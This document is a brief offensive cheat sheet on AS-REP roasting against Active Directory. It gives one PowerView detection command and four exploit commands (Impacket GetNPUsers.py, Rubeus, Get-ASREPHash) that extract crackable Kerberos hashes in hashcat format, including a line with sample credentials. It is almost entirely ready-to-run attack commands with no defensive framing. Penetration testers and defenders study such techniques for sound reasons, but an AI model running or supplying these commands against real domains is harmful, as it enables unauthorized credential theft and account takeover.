

Account takeover techniques

<b>ASREP-Roasting:</b>

Detect - Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
Exploit - python GetNPUsers.py CHANGEME.LOCAL/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
Exploit - python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
Exploit(Windows) -    .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Exploit(Windows) -    Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
